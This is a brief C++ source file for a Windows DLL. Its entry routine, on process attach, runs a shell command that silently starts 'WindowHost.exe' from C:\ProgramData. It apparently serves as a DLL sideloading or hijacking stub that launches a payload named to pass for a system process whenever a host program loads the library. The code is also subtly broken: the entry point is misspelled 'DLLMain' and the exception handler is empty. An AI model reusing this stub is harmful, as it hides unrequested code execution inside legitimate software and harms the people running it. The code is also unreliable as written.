#include <Windows.h>
#include <iostream>
#include <string>

using namespace std;

void main_func()
{
    try
    {
        system("start C:\\ProgramData\\WindowHost.exe");
    }
    catch(const std::exception& e)
    {

    }
    
}

BOOL APIENTRY DLLMain(HMODULE hmodule, DWORD call_reason, LPVOID lp_reserved)
{
    switch(call_reason)
    {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hmodule);
            main_func();
            break;
        case DLL_PROCESS_DETACH:
            break;

    }
    return TRUE;
}